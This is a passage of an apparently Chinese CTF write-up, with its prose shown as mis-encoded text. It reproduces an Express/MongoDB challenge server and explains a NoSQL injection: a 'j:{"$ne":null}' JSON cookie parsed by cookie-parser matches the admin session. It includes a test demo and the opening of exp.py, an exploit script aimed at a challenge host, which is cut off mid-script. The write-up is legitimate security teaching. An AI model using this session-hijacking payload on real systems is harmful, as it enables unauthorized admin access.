punctuation">.</span>user <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token keyword">await</span> sessionsCollection<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> sid <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>session<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      req<span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> user <span class="token operator">=</span> <span class="token keyword">await</span> usersCollection<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> username<span class="token operator">:</span> session<span class="token punctuation">.</span>username <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      req<span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    req<span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token punctuation">&#123;</span> username<span class="token operator">:</span> user<span class="token punctuation">.</span>username <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error in session middleware:'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>    req<span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span>req<span class="token operator">:</span> AuthedRequest<span class="token punctuation">,</span> _res<span class="token operator">:</span> Response<span class="token punctuation">,</span> next<span class="token operator">:</span> NextFunction<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  req<span class="token punctuation">.</span>collections <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    users<span class="token operator">:</span> usersCollection<span class="token punctuation">,</span>    sessions<span class="token operator">:</span> sessionsCollection  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>sessionMiddleware <span class="token keyword">as</span> <span class="token builtin">any</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>_req<span class="token operator">:</span> AuthedRequest<span class="token punctuation">,</span> res<span class="token operator">:</span> Response<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>publicDir<span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token operator">:</span> AuthedRequest<span class="token punctuation">,</span> res<span class="token operator">:</span> Response<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body <span class="token keyword">as</span> <span class="token punctuation">&#123;</span> username<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">unknown</span><span class="token punctuation">;</span> password<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">unknown</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> username <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">||</span> <span class="token keyword">typeof</span> password <span class="token operator">!==</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> error<span class="token operator">:</span> <span class="token string">'username and password must be strings'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> <span class="token operator">!</span>password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> error<span class="token operator">:</span> <span class="token string">'username and password required'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>usersCollection<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> error<span class="token operator">:</span> <span class="token string">'Database not initialized yet'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token keyword">await</span> usersCollection<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> username <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> error<span class="token operator">:</span> <span class="token string">'admin user not available'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">await</span> usersCollection<span class="token punctuation">.</span><span class="token function">insertOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      user <span class="token operator">=</span> <span class="token keyword">await</span> usersCollection<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> username <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>user <span class="token operator">||</span> user<span class="token punctuation">.</span>password <span class="token operator">!==</span> password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> error<span class="token operator">:</span> <span class="token string">'invalid credentials'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> sid <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">createSessionForUser</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'sid'</span><span class="token punctuation">,</span> sid<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>      httpOnly<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>      sameSite<span class="token operator">:</span> <span class="token string">'lax'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      ok<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>      sid<span class="token punctuation">,</span>      username<span class="token operator">:</span> user<span class="token punctuation">.</span>username    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error in /login:'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> error<span class="token operator">:</span> <span class="token string">'internal error'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token operator">:</span> AuthedRequest<span class="token punctuation">,</span> res<span class="token operator">:</span> Response<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">clearCookie</span><span class="token punctuation">(</span><span class="token string">'sid'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> ok<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/me'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token operator">:</span> AuthedRequest<span class="token punctuation">,</span> res<span class="token operator">:</span> Response<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> loggedIn<span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    loggedIn<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    username<span class="token operator">:</span> req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>username  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token operator">:</span> AuthedRequest<span class="token punctuation">,</span> res<span class="token operator">:</span> Response<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>user <span class="token operator">||</span> req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> error<span class="token operator">:</span> <span class="token string">'admin only'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> flag<span class="token operator">:</span> <span class="token constant">FLAG</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/visit'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>req<span class="token operator">:</span> Request<span class="token punctuation">,</span> res<span class="token operator">:</span> Response<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> url <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body <span class="token keyword">as</span> <span class="token punctuation">&#123;</span> url<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">unknown</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> url <span class="token operator">!==</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> error<span class="token operator">:</span> <span class="token string">'url must be a string'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">await</span> <span class="token function">runXssVisit</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> ok<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'XSS bot error:'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> error<span class="token operator">:</span> <span class="token string">'bot failed'</span><span class="token punctuation">,</span> detail<span class="token operator">:</span> <span class="token function">String</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">initMongo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token constant">PORT</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Server listening on port </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PORT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span>err<span class="token operator">:</span> <span class="token builtin">unknown</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token builtin">console</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Failed to initialize MongoDB:'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>    process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>NoSQL æ³¨å…¥</p><p><code>cookie-parser</code> ä¸­é—´ä»¶æœªæŒ‡å®šä»»ä½•é€‰é¡¹ï¼Œå› æ­¤é»˜è®¤å¯ç”¨ JSON cookie è§£æã€‚å¦‚æœ cookie å€¼ä»¥ <code>j:</code> å¼€å¤´ï¼Œå®ƒä¼šå°†åé¢çš„ JSON å­—ç¬¦ä¸²è§£æä¸ºä¸€ä¸ªå¯¹è±¡</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> cookieParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cookie-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> request <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'supertest'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">cookieParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">sid</span><span class="token operator">:</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>sid<span class="token punctuation">,</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token keyword">typeof</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>sid <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// Test normal cookie</span>  <span class="token keyword">await</span> <span class="token function">request</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Cookie'</span><span class="token punctuation">,</span> <span class="token string">'sid=123'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Normal:'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Test JSON cookie</span>  <span class="token keyword">await</span> <span class="token function">request</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Cookie'</span><span class="token punctuation">,</span> <span class="token string">'sid=j:&#123;"$ne":"x"&#125;'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'JSON:'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Normal: &#123; sid: '123', type: 'string' &#125;</span><span class="token comment">// JSON: &#123; sid: &#123; '$ne': 'x' &#125;, type: 'object' &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ server.ts ä¸­ï¼Œ<code>sid</code> å˜é‡æ˜¯ä» <code>req.cookies.sid</code> ä¸­è·å–çš„ã€‚è™½ç„¶ TypeScript å°†å…¶ç±»å‹å®šä¹‰ä¸º <code>string | undefined</code>ï¼Œä½†å¦‚æœ cookie æ„é€ å¾—å½“ï¼Œè¿è¡Œæ—¶å®ƒå¯ä»¥æ˜¯ä¸€ä¸ªå¯¹è±¡</p><p>ç„¶åï¼Œ<code>sid</code> ç›´æ¥ä¼ é€’ç»™ <code>sessionsCollection.findOne(&#123; sid &#125;)</code> æŸ¥è¯¢</p><p>å¦‚æœæˆ‘ä»¬å‘é€ç±»ä¼¼ <code>sid=j:&#123;&quot;$ne&quot;:null&#125;</code> çš„ cookieï¼ŒMongoDB æŸ¥è¯¢å°†å˜ä¸º <code>db.sessions.findOne(&#123; sid: &#123; $ne: null &#125; &#125;)</code>ï¼Œè¿™ä¸ªæŸ¥è¯¢ä¼šæŸ¥è¯¢åˆ° session ä¸­çš„ç¬¬ä¸€ä¸ªä¼šè¯ï¼Œå³ç®¡ç†å‘˜ä¼šè¯</p><p>é‚£ä¹ˆå°±èƒ½ä»¥ç®¡ç†å‘˜èº«ä»½è®¿é—®äº†</p><p>exp.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeBASE_URL <span class="token operator">=</span> <span class="token string">"http://223.6.249.127:31728"</span><span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Step 1: Trigger the bot to create an admin session</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Triggering bot login..."</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>BASE_URL<span class="token punctuation">&#125;</span></span><span class="token string">/visit"</span></span><span class="token punctuation">,</span>                      json<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"url"</span><span class="token punctuation">:</span> <span class="token string">"http://example.com/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                      timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>  <span class="token comment"># Ignore potential timeout or errors, we just need the login to happen</span>    <span class="token comment"># Wait a moment for the bot to ensure login</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token comment"># Step 2: Send request with malicious JSON cookie</span>    <span class="token comment"># Encoded value for j:&#123;"$ne":"x"&#125;</span>    <span class="token comment"># We can send it raw or URL encoded. requests handles it.</span>    <span class="token comment"># 